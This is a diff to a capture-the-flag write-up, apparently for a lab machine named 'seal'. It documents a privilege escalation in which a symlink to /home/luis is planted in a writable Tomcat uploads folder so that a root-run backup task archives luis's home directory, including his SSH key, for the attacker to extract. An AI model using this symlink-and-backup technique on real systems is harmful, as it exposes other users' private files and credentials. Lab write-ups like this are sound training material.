@@ -481,7 +481,7 @@ We were right, `root` is `running` the task as user `luis` using `Ansible-Playbo
 
 <br />
 
-To exploit this I need to find a folder where I can write in the tomcat directory. For example, the /uploads folder:
+To `exploit` this I need to `find` a `folder` in the `tomcat` directory where I can `write`. For example, the `/uploads` folder:
 
 <br />
 
@@ -498,6 +498,55 @@ drwxrwxrwx 2 root root  4096 May  7  2021 uploads
 
 <br />
 
-Once this is done, we will proceed to create a `symbolic link` to the user luis `id_rsa` in `/uploads`, so when the `task` is `executed` and all the contents of the `tomcat` folder are `compressed`, we can `gunzip` the `compressed` and `access` the `id_rsa`:
+Once this is done, we will proceed to create a `symbolic link` to the user luis home directory `/uploads`, so when the `task` is `executed` and all the contents of the `tomcat` folder are `compressed`, we can `gunzip` the `compressed` and `access` to `all` the files in `/home/luis`:
+
+<br />
+
+```bash
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis .
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -l
+total 0
+lrwxrwxrwx 1 tomcat tomcat 10 Feb  9 15:54 luis -> /home/luis
+```
+
+<br />
+
+Once created, we go to the `/opt/backup/archives` directory to `locate` the backup with the `content`, the only one with a `big size` and we copy it on `/tmp`:
+
+<br />
+
+```bash
+tomcat@seal:/opt/backups/archives$ ls -l
+total 114076
+-rw-rw-r-- 1 luis luis    606061 Feb  9 16:00 backup-2025-02-09-16:00:32.gz
+-rw-rw-r-- 1 luis luis    606061 Feb  9 16:01 backup-2025-02-09-16:01:32.gz
+-rw-rw-r-- 1 luis luis 115598732 Feb  9 16:02 backup-2025-02-09-16:02:32.gz
+tomcat@seal:/opt/backups/archives$ cp backup-2025-02-09-16:02:32.gz /tmp
+```
+
+<br />
+
+When we apply a `gunzip` to the `compressed` we are left with a `tar file`:
+
+<br />
+
+```bash
+tomcat@seal:/tmp$ gunzip backup-2025-02-09-16\:02\:32.gz
+tomcat@seal:/tmp$ file backup-2025-02-09-16\:02\:32 
+backup-2025-02-09-16:02:32: POSIX tar archive
+```
+
+<br />
+
+So we `rename` it and `unzip` it `again` with `tar -xf`:
+
+<br />
+
+```bash
+tomcat@seal:/tmp$ mv backup-2025-02-09-16\:02\:32 backup.tar
+tomcat@seal:/tmp$ tar -xf backup.tar 
+tomcat@seal:/tmp$ ls
+backup.tar  dashboard  hsperfdata_tomcat  Privesc
+```
 
 <br />
